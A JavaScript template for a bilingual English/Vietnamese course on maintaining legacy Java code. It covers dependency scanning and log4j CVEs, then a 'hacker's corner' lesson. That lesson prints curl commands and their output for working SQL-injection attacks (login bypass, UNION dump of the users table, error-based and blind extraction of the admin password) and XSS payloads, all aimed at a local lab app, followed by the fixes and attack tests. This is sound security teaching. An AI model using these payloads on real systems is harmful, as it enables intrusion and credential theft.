<li>${en ? '<strong>Silence is not safety:</strong> <code>log4j:log4j 1.2.17</code> and <code>commons-lang 2.6</code> are not listed — because they are the last versions ever released under those names. “Up to date” here means “dead”. Their successors are different artifacts (<code>log4j-core</code> 2.x, <code>commons-lang3</code>, or the drop-in <code>reload4j</code>).' : '<strong>Im lặng không có nghĩa là an toàn:</strong> <code>log4j:log4j 1.2.17</code> và <code>commons-lang 2.6</code> không có trong danh sách — vì đó là bản cuối cùng từng ra dưới tên đó. "Mới nhất" ở đây nghĩa là "đã chết". Người kế nhiệm là thư viện khác tên (<code>log4j-core</code> 2.x, <code>commons-lang3</code>, hoặc <code>reload4j</code> thay thẳng được).'}</li>
</ul>

<h3>${en ? 'Java: what is vulnerable — OWASP Dependency-Check' : 'Java: cái gì có lỗ hổng — OWASP Dependency-Check'}</h3>
<p>${en
  ? 'Dependency-Check (an OWASP project since 2012) identifies each jar, maps it to a CPE name, and matches it against NVD. Getting it to run on a 2016 project was itself a small maintenance task — exactly the friction you will meet at work:'
  : 'Dependency-Check (dự án OWASP từ 2012) nhận diện từng jar, gán nó với một tên CPE, rồi đối chiếu với NVD. Làm nó chạy được trên một dự án năm 2016 đã là một việc bảo trì nhỏ — đúng kiểu ma sát bạn sẽ gặp khi đi làm:'}</p>
${O62_ODC_LOI}
<ol>
<li>${en ? 'Modern scanners need modern JDKs. The <em>project</em> stays on Java 8; the <em>scanner</em> runs on JDK 21 (a different Docker image). This separation recurs with every tool in Chapter 7.' : 'Máy quét hiện đại cần JDK hiện đại. <em>Dự án</em> vẫn ở Java 8; <em>máy quét</em> chạy trên JDK 21 (một ảnh Docker khác). Kiểu tách này lặp lại với mọi công cụ ở Chương 7.'}</li>
<li>${en ? 'Downloading NVD directly without an API key is extremely slow; the project publishes a cache (<code>nvdDatafeedUrl</code>). For a team, request a free NVD API key and keep the data directory in CI cache.' : 'Tải NVD trực tiếp mà không có API key rất chậm; dự án có công bố một bản cache (<code>nvdDatafeedUrl</code>). Với nhóm, xin API key NVD miễn phí và giữ thư mục dữ liệu trong cache của CI.'}</li>
<li>${en ? 'Old scanner versions break on new data (a 1,585-character URL in a 2026 CVE). Update the tool before blaming the project.' : 'Bản máy quét cũ vỡ khi gặp dữ liệu mới (một URL 1.585 ký tự trong một CVE năm 2026). Cập nhật công cụ trước khi đổ lỗi cho dự án.'}</li>
<li>${en ? 'The CISA Known-Exploited list returned 403 to this machine; we disabled that analyzer and say so here. Sonatype OSS Index now requires a token. A report produced with analyzers off must say which ones were off.' : 'Danh sách Known Exploited của CISA trả 403 cho máy này; ta tắt bộ phân tích đó và ghi rõ ở đây. Sonatype OSS Index nay đòi token. Báo cáo tạo ra khi tắt bộ phân tích nào thì phải ghi rõ bộ nào.'}</li>
</ol>
${O62_ODC}

<h3>${en ? 'Reachability again — and the Log4Shell confusion' : 'Lại là khả năng chạm tới — và nhầm lẫn với Log4Shell'}</h3>
${O62_LOG4J}
<p>${en
  ? 'Every log4j 1.x CVE above lives in a component this configuration never loads: <code>SocketServer</code>, <code>JMSAppender</code>/<code>JMSSink</code>, <code>JDBCAppender</code>, <code>Chainsaw</code>, <code>SocketAppender</code>. Only <code>ConsoleAppender</code> is configured. So the urgency is low — but log4j 1.x is EOL, any future CVE will never be fixed, and a single line in <code>log4j.properties</code> (say, a JDBCAppender someone adds for “audit logging”) would make CVE-2022-23305 reachable. Upgrade, calmly.'
  : 'Mọi CVE của log4j 1.x ở trên nằm trong thành phần mà cấu hình này không bao giờ nạp: <code>SocketServer</code>, <code>JMSAppender</code>/<code>JMSSink</code>, <code>JDBCAppender</code>, <code>Chainsaw</code>, <code>SocketAppender</code>. Chỉ có <code>ConsoleAppender</code>. Nên mức khẩn cấp thấp — nhưng log4j 1.x đã hết vòng đời, CVE nào sau này cũng sẽ không được sửa, và chỉ một dòng trong <code>log4j.properties</code> (chẳng hạn ai đó thêm JDBCAppender để "ghi log kiểm toán") là CVE-2022-23305 thành chạm tới được. Nâng cấp, bình tĩnh.'}</p>
<p>${en
  ? 'And the question every manager asked in December 2021: “are we affected by Log4Shell?” CVE-2021-44228 is in <strong>log4j 2</strong> (<code>log4j-core</code> 2.0-beta9 to 2.14.1), in the JNDI lookup feature that 1.x does not have. This project was not affected by Log4Shell — and that is not the same as “log4j is fine here”. Answer with the artifact name and version, not with the word “log4j”.'
  : 'Và câu mọi quản lý đều hỏi tháng 12/2021: "mình có dính Log4Shell không?" CVE-2021-44228 nằm ở <strong>log4j 2</strong> (<code>log4j-core</code> từ 2.0-beta9 tới 2.14.1), trong tính năng tra cứu JNDI mà bản 1.x không có. Dự án này không dính Log4Shell — và điều đó không giống với "log4j ở đây ổn". Hãy trả lời bằng tên thư viện và số phiên bản, đừng chỉ bằng chữ "log4j".'}</p>

<h3>${en ? 'Choosing upgrades in a legacy project' : 'Chọn cách nâng cấp trong dự án cũ'}</h3>
<table>
<tr><th>${en ? 'Kind' : 'Loại'}</th><th>${en ? 'Example here' : 'Ví dụ ở đây'}</th><th>${en ? 'How' : 'Cách làm'}</th></tr>
<tr><td>${en ? 'Patch/minor in the same line' : 'Bản vá/minor cùng dòng'}</td><td>express 4.17.1 → 4.22.3, moment 2.24 → 2.31</td><td>${en ? 'One PR, tests + golden master, low risk' : 'Một PR, test + golden master, rủi ro thấp'}</td></tr>
<tr><td>${en ? 'Drop-in successor' : 'Người kế nhiệm thay thẳng'}</td><td>log4j 1.2.17 → reload4j 1.2.27</td><td>${en ? 'Same package names, zero code change — lab 6.4' : 'Cùng tên package, không sửa dòng mã nào — lab 6.4'}</td></tr>
<tr><td>${en ? 'Renamed artifact, new major' : 'Đổi tên + major mới'}</td><td>Connector/J 5.1 → mysql-connector-j 26.x</td><td>${en ? 'Read the migration notes (driver class, time zones), run everything — lab 6.4' : 'Đọc ghi chú chuyển đổi (tên lớp driver, múi giờ), chạy mọi thứ — lab 6.4'}</td></tr>
<tr><td>${en ? 'Deprecated, no successor' : 'Bị bỏ, không có bản kế'}</td><td>request</td><td>${en ? 'Replace in code, behind tests — lesson 7.4' : 'Thay trong code, sau khi có test — bài 7.4'}</td></tr>
<tr><td>${en ? 'Platform-bound' : 'Gắn với nền tảng'}</td><td>javax.servlet 3.1, Jest 26</td><td>${en ? 'Part of the Java/Tomcat/Node upgrade — Chapter 7' : 'Đi cùng lần nâng Java/Tomcat/Node — Chương 7'}</td></tr>
</table>

<h3>💼 ${en ? 'OJT situation: “the scan is red, the release is Friday”' : 'Tình huống OJT: "máy quét báo đỏ, thứ Sáu phát hành"'}</h3>
<p>${en
  ? 'Many outsourcing customers run their own scanner (often Dependency-Check, Snyk or Black Duck) and send the PDF to the vendor. Your lead forwards it: 8 CVEs, two CRITICAL. The intern who replies “we upgraded everything” on Thursday night breaks production. The one who replies with a table — CVE, component, reachable?, evidence, action, ETA — and fixes the cheap ones first is the one who gets the next security ticket. Put the reachability evidence in the PR description; the customer’s security team will ask.'
  : 'Nhiều khách outsourcing tự chạy máy quét (thường là Dependency-Check, Snyk hoặc Black Duck) và gửi bản PDF cho bên làm phần mềm. Trưởng nhóm chuyển tiếp cho bạn: 8 CVE, hai CRITICAL. Bạn thực tập nào tối thứ Năm trả lời "bọn em nâng hết rồi" là làm vỡ production. Bạn nào trả lời bằng một bảng — CVE, thành phần, chạm tới được không, bằng chứng, hành động, thời hạn — và sửa những cái rẻ trước, là người được giao ticket bảo mật kế tiếp. Đưa bằng chứng về khả năng chạm tới vào mô tả PR; đội bảo mật của khách sẽ hỏi.'}</p>

<h3>🎤 ${en ? 'What the interviewer will ask' : 'Phỏng vấn viên sẽ hỏi'}</h3>
<ol>
<li><strong>${en ? '“npm audit shows 66 vulnerabilities. What do you do?”' : '"npm audit báo 66 lỗ hổng. Em làm gì?"'}</strong><br>${en
  ? 'Run it with --production first (here 66 → 24), group by advisory, check reachability for the high ones, then upgrade within the same major where possible, with tests as the referee. Dev-only findings go to a separate, lower-priority ticket.'
  : 'Chạy với --production trước (ở đây 66 → 24), gom theo khuyến cáo, kiểm khả năng chạm tới với các lỗi cao, rồi nâng trong cùng major khi được, với test làm trọng tài. Lỗi chỉ ở công cụ dev đưa sang ticket riêng, ưu tiên thấp hơn.'}</li>
<li><strong>${en ? '“Is CVSS 9.8 always urgent?”' : '"CVSS 9.8 lúc nào cũng khẩn cấp?"'}</strong><br>${en
  ? 'It is urgent to <em>assess</em>. log4j 1.x has three 9.8s in components our configuration never loads; that is a planned upgrade. A 5.3 in code that parses every request could be more urgent.'
  : 'Khẩn cấp để <em>đánh giá</em>. log4j 1.x có ba lỗi 9.8 nằm trong thành phần mà cấu hình của ta không nạp; đó là việc nâng cấp có kế hoạch. Một lỗi 5.3 trong đoạn code đọc mọi request có khi còn gấp hơn.'}</li>
<li><strong>${en ? '“Were you affected by Log4Shell?”' : '"Dự án có dính Log4Shell không?"'}</strong><br>${en
  ? 'Answer with coordinates: Log4Shell is log4j-core 2.0-beta9 – 2.14.1. This project used log4j 1.2.17 — not affected by that CVE, but EOL with its own CVEs, so we moved to reload4j.'
  : 'Trả lời bằng tọa độ: Log4Shell là log4j-core 2.0-beta9 – 2.14.1. Dự án này dùng log4j 1.2.17 — không dính CVE đó, nhưng đã hết vòng đời và có CVE riêng, nên đã chuyển sang reload4j.'}</li>
<li><strong>${en ? '“Why not just run npm audit fix --force?”' : '"Sao không chạy luôn npm audit fix --force?"'}</strong><br>${en
  ? 'It may jump majors without reading changelogs, in one huge lockfile diff that nobody can review. I prefer named upgrades, one or two per PR, each verified by tests.'
  : 'Nó có thể nhảy bản major mà không đọc changelog, trong một diff lockfile khổng lồ không ai review được. Em chọn nâng từng thư viện có tên, một hai cái mỗi PR, cái nào cũng được test kiểm.'}</li>
</ol>

<h3>🗂 ${en ? 'Key terms' : 'Thuật ngữ trong bài'}</h3>
${thuatNgu(en, [
  ['CVE / GHSA', 'mã lỗ hổng', 'CVE là mã công khai toàn cầu; GHSA là mã khuyến cáo của GitHub (npm audit dùng).', 'CVE is the global public ID; GHSA is GitHub’s advisory ID (used by npm audit).'],
  ['CVSS', 'điểm nghiêm trọng', 'Điểm 0–10 của lỗ hổng nói chung, không phải rủi ro trong ứng dụng của bạn.', 'A 0–10 score of the vulnerability in general, not of the risk in your app.'],
  ['Reachability', 'khả năng chạm tới', 'Dữ liệu đầu vào của bạn có tới được hàm bị lỗi không — đo bằng thử thật.', 'Whether your inputs can reach the vulnerable function — measured by trying.'],
  ['Transitive dependency', 'phụ thuộc bắc cầu', 'Thư viện do thư viện của bạn kéo theo.', 'A library pulled in by one of your libraries.'],
  ['EOL', 'hết vòng đời', 'Không còn bản sửa, kể cả cho lỗ hổng mới.', 'No more fixes, even for new vulnerabilities.'],
  ['SCA', 'phân tích thành phần', 'Công cụ đối chiếu danh sách thư viện với cơ sở dữ liệu lỗ hổng.', 'Tools matching your dependency list against vulnerability databases.'],
])}

<h3>📌 ${en ? 'Summary' : 'Tóm tắt'}</h3>
<ul>
<li>${en ? 'Scan with three questions: what is outdated (versions plugin), what is vulnerable (audit, Dependency-Check), what is reachable (you).' : 'Quét với ba câu hỏi: cái gì cũ (versions plugin), cái gì có lỗ hổng (audit, Dependency-Check), cái gì chạm tới được (chính bạn).'}</li>
<li>${en ? 'Every tool has blind spots: exact pins, renamed artifacts, milestones, last-ever versions, disabled analyzers.' : 'Công cụ nào cũng có điểm mù: ghim cứng, thư viện đổi tên, bản milestone, bản cuối cùng, bộ phân tích bị tắt.'}</li>
<li>${en ? 'Same-line upgrades first, behind the characterization tests; renames and replacements as their own PRs.' : 'Nâng cùng dòng trước, sau lưới characterization test; đổi tên và thay thế thành PR riêng.'}</li>
</ul>
${lk(bai('nodejs', 'nodejs-4-3-bao-mat-npm'), '📦', en ? 'Node.js 4.3 — Supply-chain safety' : 'Node.js 4.3 — An toàn chuỗi cung ứng', en ? 'lockfiles, npm ci, malicious packages' : 'lockfile, npm ci, gói độc hại')}
${lk(bai('devsecops', 'dso-4-2-osv'), '🛡', en ? 'DevSecOps 4.2 — OSV-Scanner, Snyk, Dependency-Check, Trivy' : 'DevSecOps 4.2 — So sánh OSV-Scanner, Snyk, Dependency-Check, Trivy', en ? 'putting the scan into CI' : 'đưa máy quét vào CI')}
${tl('https://jeremylong.github.io/DependencyCheck/dependency-check-maven/', '📘', 'OWASP Dependency-Check — Maven plugin', en ? 'configuration, suppression, failBuildOnCVSS' : 'cấu hình, suppression, failBuildOnCVSS')}
`);

/* ═══════════════════ 6.3 — Góc hacker ═══════════════════ */
const O63_1 = out(`
$ bash tan-cong.sh       # CHÍNH bản lab trên máy bạn (máy soạn bài dùng cổng 41880; mặc định của lab là 18080)
## 1. Vào bằng tài khoản admin mà không cần mật khẩu
$ curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}' --data-urlencode "username=admin' -- " -d password=bat-ky $B/login
302 -> http://127.0.0.1:41880/thuvien/books
`);
const O63_2 = out(`
## 2. UNION qua ô tìm kiếm: đọc bảng users
$ curl -s -b $cj -G --data-urlencode "q=zzz' UNION SELECT id, username, password, role, 0, 0 FROM users -- " $B/books | grep -E '<td>[^<]*</td>' | head -8
    <td>1</td>
    <td>admin</td>
    <td>admin123</td>
    <td>ADMIN</td>
    <td>0/0</td>
    <td>2</td>
    <td>thuthu</td>
    <td>123456</td>
`);
const O63_34 = out(`
## 3. Error-based: thông báo lỗi in thẳng dữ liệu
$ curl -s -b $cj -d 'action=borrow&bookId=1' --data-urlencode "readerId=2 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin')))" $B/books
<html><body><h3>Loi: XPATH syntax error: '~admin123'</h3></body></html>

## 4. Blind theo thời gian: hỏi có/không từng ký tự
$ curl -s -b $cj -o /dev/null -w 'a: %{time_total}s' -d 'action=borrow&bookId=1' --data-urlencode "readerId=2 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(2),0)" $B/books
a: 2.003734s
$ curl -s -b $cj -o /dev/null -w 'd: %{time_total}s' -d 'action=borrow&bookId=1' --data-urlencode "readerId=2 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='d',SLEEP(2),0)" $B/books
d: 0.003711s
`);
const O63_5 = out(`
## 5. Chức năng không có nút (xoaSach) vẫn gọi được — và nối chuỗi
$ curl -s -b $cj -o /dev/null -w '%{http_code}' --data-urlencode 'id=0 OR id NOT IN (SELECT book_id FROM loans)' -d action=delete $B/books
302
$ echo 'SELECT COUNT(*) AS con_lai FROM books;' | $NAP 2>/dev/null
con_lai
4
`);
const O63_67 = out(`
## 6. XSS phản chiếu qua tham số msg
$ curl -s -b $cj -G --data-urlencode 'msg=<script>alert(document.cookie)</script>' $B/books | grep -n script
18:  <p style="color:green"><script>alert(document.cookie)</script></p>

## 7. XSS lưu trữ: tên sách chứa mã
$ curl -s -b $cj -o /dev/null -w '%{http_code}' -d action=add -d code=X99 --data-urlencode 'title=<img src=x onerror=alert(1)>' -d author=a -d quantity=1 $B/books
302
$ curl -s -b $cj $B/books | grep -n onerror
140:    <td><img src=x onerror=alert(1)></td>
`);
const O63_89 = out(`
## 8. Cookie 'ghi nhớ' giả được cho bất kỳ ai (bí mật nằm trong mã nguồn)
$ curl -s -D - -o /dev/null -d 'username=thuthu&password=123456&remember=on' $B/login | grep -i '^set-cookie: remember'
Set-Cookie: remember=thuthu:37876f012402c506e151a9f407c5c1f9; Max-Age=2592000; Expires=Wed, 23 Dec 2026 22:22:32 GMT
$ T=$(printf '%s' 'adminthuvien2016' | md5sum | cut -d' ' -f1); curl -s -c $cj2 -o /dev/null -w '%{http_code} -> %{redirect_url}' -b "remember=admin:$T" $B/login
302 -> http://127.0.0.1:41880/thuvien/books
$ curl -s -b $cj2 $B/books | grep -o 'Xin ch[^|]*'
Xin chÃ o admin

## 9. Mật khẩu lưu thô
$ echo 'SELECT username, password FROM users;' | $NAP 2>/dev/null
username	password
admin	admin123
thuthu	123456
`);
const C63_TEST102 = java(`
// BookServletMuonSachTest — test TẤN CÔNG viết TRƯỚC khi sửa (TV-102). Trên code cũ cả hai phải ĐỎ.
@Test
void readerIdChuaSQL_khongDuocChay_TV102() throws Exception {
    long batDau = System.nanoTime();
    String kq = muon("2 AND SLEEP(1)", "1");
    long ms = (System.nanoTime() - batDau) / 1_000_000;
    assertTrue(ms < 500, "câu SQL do người dùng gõ đã chạy trong MySQL (" + ms + " ms)");
    assertEquals("books?msg=Mã độc giả không hợp lệ", kq);
}

@Test
void readerIdChuaSQL_khongLoMatKhau_TV102() throws Exception {
    String kq = muon("2 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin')))", "1");
    assertFalse(kq.contains("admin123"), kq);
}
`);
const O63_DO = out(`
$ mvn -B -o test | grep '^\\[ERROR\\]'      # (trích)
[ERROR] com.thuvien.servlet.BookServletMuonSachTest.readerIdChuaSQL_khongLoMatKhau_TV102 -- Time elapsed: 0.044 s <<< FAILURE!
[ERROR] com.thuvien.servlet.BookServletMuonSachTest.readerIdChuaSQL_khongDuocChay_TV102 -- Time elapsed: 1.025 s <<< FAILURE!
[ERROR] com.thuvien.servlet.BookServletTraSachTest.loanIdChuaSQL_khongTraNhamPhieu_TV102 -- Time elapsed: 0.023 s <<< ERROR!
[ERROR]   BookServletMuonSachTest.readerIdChuaSQL_khongDuocChay_TV102:108 câu SQL do người dùng gõ đã chạy trong MySQL (1002 ms) ==> expected: <true> but was: <false>
[ERROR]   BookServletMuonSachTest.readerIdChuaSQL_khongLoMatKhau_TV102:115 <html><body><h3>Loi: XPATH syntax error: '~admin123'</h3></body></html> ==> expected: <false> but was: <true>
[ERROR]   BookServletTraSachTest.loanIdChuaSQL_khongTraNhamPhieu_TV102:76->tra:47 » NullPointer
[ERROR] Tests run: 36, Failures: 2, Errors: 1, Skipped: 0
`);
const O63_DIFF102 = out(`
$ git show 868c7b9 -- src/main/java/com/thuvien/dao/PhieuMuonDAO.java      # (trích)
-    public LoaiDocGia loaiCuaDocGia(String readerId) throws SQLException {
-        Statement st = con.createStatement();
+    public LoaiDocGia loaiCuaDocGia(int readerId) throws SQLException {
+        PreparedStatement st = con.prepareStatement("SELECT * FROM readers WHERE id = ?");
         ResultSet rs = null;
         try {
-            rs = st.executeQuery("SELECT * FROM readers WHERE id = " + readerId);
+            st.setInt(1, readerId);
+            rs = st.executeQuery();
             return rs.next() ? LoaiDocGia.tu(rs.getString("type")) : null;
`);
const C63_SONGUYEN = java(`
// MuonTraService — chuỗi người dùng gõ được kiểm ở biên nghiệp vụ, DAO chỉ nhận int
public KetQua muon(String maDocGia, String maSach) throws SQLException {
    Integer readerId = soNguyen(maDocGia);
    if (readerId == null) return new KetQua("books", "Mã độc giả không hợp lệ", false);   // TV-102: không chạm CSDL
    Integer bookId = soNguyen(maSach);
    if (bookId == null) return new KetQua("books", "Mã sách không hợp lệ", false);
    LoaiDocGia loai = dao.loaiCuaDocGia(readerId);
    // … phần còn lại y như Chương 5, kể cả bug TV-41 ">"
}

/** Chuỗi người dùng gõ ⇒ số nguyên, hoặc null nếu không phải số (kể cả "2 AND SLEEP(1)"). Khoảng trắng hai đầu được bỏ như câu SQL cũ. */
static Integer soNguyen(String s) {
    if (s == null || !s.trim().matches("-?\\\\d{1,9}")) return null;
    return Integer.valueOf(s.trim());
}
`);
const O63_XANH = out(`
$ mvn -B -o test | grep 'Tests run:' | tail -1
[INFO] Tests run: 36, Failures: 0, Errors: 0, Skipped: 0
$ git log --oneline -1
868c7b9 fix(6.3): TV-102 SQL injection trong muon/tra — PreparedStatement + kiem ma la so
`);
const C63_LOI = java(`
// BookServlet.doPost — trước: out.println("<html><body><h3>Loi: " + e.getMessage() + "</h3></body></html>");
} catch (Exception e) {
    // Bài 6.3 (CWE-209): chi tiết lỗi vào log cho dev, người dùng chỉ thấy mã tra cứu
    String maLoi = UUID.randomUUID().toString().substring(0, 8);
    log.error("loi " + maLoi + " action=" + action, e);
    PrintWriter out = response.getWriter();
    out.println("<html><body><h3>Loi he thong, vui long thu lai (ma loi " + maLoi + ")</h3></body></html>");
}
`);
const O63_LOI_LOG = out(`
$ mvn -B -o test | grep -A2 "ERROR BookServlet - loi"      # log khi chạy test bookIdKhongTonTai
05:27:18 ERROR BookServlet - loi 993021f9 action=borrow
java.sql.SQLException: Illegal operation on empty result set.
	at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:965)
`);
const C63_HTML = java(`
/** Thoát chữ trước khi in vào HTML (bài 6.3 — chống XSS). Chỉ đổi 5 ký tự có nghĩa trong HTML. */
public final class Html {
    public static String thoat(Object giaTri) {
        if (giaTri == null) return "";
        String s = String.valueOf(giaTri);
        StringBuilder sb = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '&': sb.append("&amp;"); break;
                case '<': sb.append("&lt;"); break;
                case '>': sb.append("&gt;"); break;
                case '"': sb.append("&quot;"); break;
                case '\\'': sb.append("&#39;"); break;
                default: sb.append(c);
            }
        }
        return sb.toString();
    }
}
`);
const O63_JSP = out(`
$ git show c2c0e24 -- src/main/webapp/books.jsp | grep '^[-+] '
-  <p style="color:green"><%= request.getParameter("msg") %></p>
+  <p style="color:green"><%= Html.thoat(request.getParameter("msg")) %></p>
-  <input name="q" value="<%= request.getParameter("q") == null ? "" : request.getParameter("q") %>">
+  <input name="q" value="<%= Html.thoat(request.getParameter("q")) %>">
-    <td><%= b.getCode() %></td>
-    <td><%= b.getTitle() %></td>
-    <td><%= b.getAuthor() %></td>
+    <td><%= Html.thoat(b.getCode()) %></td>
+    <td><%= Html.thoat(b.getTitle()) %></td>
+    <td><%= Html.thoat(b.getAuthor()) %></td>
`);
const O63_ESC = out(`
$ java ThuEscape      # cùng một chuỗi qua hai cách thoát
L&#7853;p tr&igrave;nh Java &lt;b&gt;
Lập trình Java &lt;b&gt;
`);
const O63_CI = out(`
$ for p in admin123 ADMIN123 "admin123   " admin12; do printf '%-14s' "[$p]"; \\
    curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\\n' -d username=admin --data-urlencode "password=$p" $B/login; done
[admin123]    302 -> http://127.0.0.1:41880/thuvien/books
[ADMIN123]    302 -> http://127.0.0.1:41880/thuvien/books
[admin123   ] 302 -> http://127.0.0.1:41880/thuvien/books
[admin12]     200 ->
`);
const C63_MATKHAU = java(`
/** Dạng lưu: pbkdf2-sha256$<số vòng>$<muối base64>$<băm base64>. PBKDF2-HMAC-SHA256 có sẵn trong JDK 8. */
public final class MatKhau {
    static final String TIEN_TO = "pbkdf2-sha256";
    static final int SO_VONG = 600_000;                  // khuyến nghị của OWASP Password Storage Cheat Sheet
    private static final SecureRandom NGAU_NHIEN = new SecureRandom();

    public static String bam(String matKhau) {
        byte[] muoi = new byte[16];
        NGAU_NHIEN.nextBytes(muoi);
        return TIEN_TO + "$" + SO_VONG + "$" + b64(muoi) + "$" + b64(tinh(matKhau, muoi, SO_VONG));
    }

    /** Chấp nhận cả mật khẩu thô đời cũ (để nâng cấp dần) — so bằng MessageDigest.isEqual, không bằng equals. */
    public static boolean khop(String matKhau, String daLuu) {
        if (matKhau == null || daLuu == null) return false;
        if (!daLuu.startsWith(TIEN_TO + "$")) {
            return MessageDigest.isEqual(matKhau.getBytes(StandardCharsets.UTF_8), daLuu.getBytes(StandardCharsets.UTF_8));
        }
        String[] p = daLuu.split("\\\\$");
        if (p.length != 4) return false;
        byte[] muoi = Base64.getDecoder().decode(p[2]);
        return MessageDigest.isEqual(tinh(matKhau, muoi, Integer.parseInt(p[1])), Base64.getDecoder().decode(p[3]));
    }

    public static boolean nenBamLai(String daLuu) {
        return daLuu == null || !daLuu.startsWith(TIEN_TO + "$" + SO_VONG + "$");
    }

    private static byte[] tinh(String matKhau, byte[] muoi, int soVong) {
        try {
            PBEKeySpec spec = new PBEKeySpec(matKhau.toCharArray(), muoi, soVong, 256);
            return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(spec).getEncoded();
        } catch (Exception e) {
            throw new IllegalStateException("JDK thiếu PBKDF2WithHmacSHA256", e);
        }
    }
    // b64(): Base64 không đệm '='
}
`);
const O63_LOGIN = out(`
$ git show df285ba -- src/main/java/com/thuvien/servlet/LoginServlet.java | grep '^[-+] ' | head -12    # (trích)
-            st = con.createStatement();
-            rs = st.executeQuery("SELECT * FROM users WHERE username = '" + u + "' AND password = '" + p + "'");
-            if (rs.next()) {
+            // TV-105 (bài 6.3): tìm theo tên bằng tham số; so mật khẩu trong Java (không để MySQL so kiểu không phân biệt hoa/thường)
+            st = con.prepareStatement("SELECT * FROM users WHERE username = ?");
+            st.setString(1, u);
+            rs = st.executeQuery();
+            if (rs.next() && MatKhau.khop(p, rs.getString("password"))) {
+                if (MatKhau.nenBamLai(rs.getString("password"))) bamLai(con, rs.getInt("id"), p);
$ mvn -B -o test | grep '^\\[ERROR\\]'     # (trích) trước khi sửa LoginServlet: 5 test mới, 3 đỏ
[ERROR] com.thuvien.servlet.LoginServletMatKhauTest.sqlInjection_khongVaoDuoc_TV105 -- Time elapsed: 0.018 s <<< FAILURE!
[ERROR] com.thuvien.servlet.LoginServletMatKhauTest.matKhauKhacChuHoa_khongVaoDuoc_TV105 -- Time elapsed: 0.005 s <<< FAILURE!
[ERROR] com.thuvien.servlet.LoginServletMatKhauTest.sauLanDangNhapDau_matKhauDuocBam_TV105 -- Time elapsed: 0.006 s <<< FAILURE!
[ERROR] Tests run: 42, Failures: 3, Errors: 0, Skipped: 0
$ mvn -B -o test | grep 'Tests run:' | tail -1     # sau khi sửa (+ 2 test của MatKhau)
[INFO] Tests run: 44, Failures: 0, Errors: 0, Skipped: 0
`);
const O63_BAM = out(`
$ java -cp target/classes:mysql-connector-java-5.1.49.jar com.thuvien.tools.BamMatKhauCu      # quên chạy migration
Exception in thread "main" com.mysql.jdbc.MysqlDataTruncation: Data truncation: Data too long for column 'password' at row 1
$ mysql thuvien < db/migrations/V6_3__mat_khau_bam.sql
$ java … com.thuvien.tools.BamMatKhauCu
da bam: admin
da bam: thuthu
xong: 2 tai khoan da bam, 0 bo qua (da bam tu truoc)
$ java … com.thuvien.tools.BamMatKhauCu      # chạy lại
xong: 0 tai khoan da bam, 2 bo qua (da bam tu truoc)
$ mysql thuvien -e 'SELECT username, LEFT(password, 40) AS dau, LENGTH(password) AS dai FROM users'
username	dau	dai
admin	pbkdf2-sha256$600000$SUvcfHRVUapYqkTocbG	87
thuthu	pbkdf2-sha256$600000$8BJ673xl7eZiVVixnpz	87
`);
const O63_WARN = out(`
$ docker logs lgc-thuvien-web-1 2>&1 | grep WARN      # Tomcat chạy bản mới trên CSDL CHƯA migration
22:32:35 WARN  LoginServlet - chua bam lai duoc mat khau user 2 (da chay db/migrations/V6_3__mat_khau_bam.sql chua?): Data truncation: Data too long for column 'password' at row 1
`);
const O63_TG = out(`
$ # sau migration V6_3: lần 1 = so mật khẩu thô + băm lại; lần 2, 3 = so với bản băm 600.000 vòng
$ for i in 1 2 3; do curl -s -o /dev/null -w "dang nhap lan $i: %{http_code} %{time_total}s\\n" -d "username=thuthu&password=123456" $B/login; done
dang nhap lan 1: 302 0.729433s
dang nhap lan 2: 302 0.747811s
dang nhap lan 3: 302 0.726409s
$ curl -s -o /dev/null -w "sai mat khau:     %{http_code} %{time_total}s\\n" -d "username=thuthu&password=654321" $B/login
sai mat khau:     200 0.713006s
$ curl -s -o /dev/null -w "ten khong co:     %{http_code} %{time_total}s\\n" -d "username=khongco&password=654321" $B/login
ten khong co:     200 0.002853s
`);

const L63 = ml((en) => `
<span class="eyebrow">${en ? 'Chapter 6 · Hacker’s corner' : 'Chương 6 · Góc hacker'}</span>
<h2>${en ? '6.3 — The hacker’s view of old code: concatenated SQL, unescaped JSP, plaintext passwords' : '6.3 — Góc hacker trong code cũ: SQL nối chuỗi, JSP không thoát, mật khẩu lưu thô'}</h2>
<p class="lead">${en
  ? 'A building inspector does not trust the blueprint; she leans on the railing. This lesson leans on the railings of <code>legacy-thu-vien</code>: nine attacks against your own local copy, each one a real class of incident that has cost real companies real money. Then we fix them the Chapter 3 way — an attack test first, red; the fix; green — and run the same nine attacks again.'
  : 'Người kiểm định công trình không tin bản vẽ; họ tì người vào lan can. Bài này tì vào lan can của <code>legacy-thu-vien</code>: chín đòn tấn công vào chính bản cục bộ của bạn, đòn nào cũng là một loại sự cố có thật đã làm các công ty thật mất tiền thật. Sau đó ta sửa theo cách của Chương 3 — test tấn công trước, đỏ; bản sửa; xanh — rồi chạy lại đúng chín đòn đó.'}</p>
${moiTruong(en)}
<p class="callout warn">${en
  ? '⚖️ Only against your own lab. Probing systems you do not own or have no written permission to test is a crime in Vietnam (Article 289 of the 2015 Penal Code, unauthorised intrusion into computer networks) and almost everywhere else. On an outsourcing project, even the customer’s staging server needs written scope before you run anything like <code>tan-cong.sh</code>.'
  : '⚖️ Chỉ làm trên lab của chính bạn. Dò hệ thống không phải của mình hoặc chưa được cho phép bằng văn bản là phạm tội ở Việt Nam (Điều 289 Bộ luật Hình sự 2015 — xâm nhập trái phép vào mạng máy tính) và gần như mọi nơi khác. Ở dự án outsourcing, kể cả máy staging của khách cũng cần phạm vi bằng văn bản trước khi bạn chạy thứ gì giống <code>tan-cong.sh</code>.'}</p>

<h3>${en ? 'Nine attacks, one script' : 'Chín đòn, một script'}</h3>
<p>${en
  ? '<code>lab/loi-giai/ch6/tan-cong.sh</code> reloads the original dump, logs in as the librarian, and runs each attack with <code>curl</code>. Every output below is from the Chapter 5 code, unchanged.'
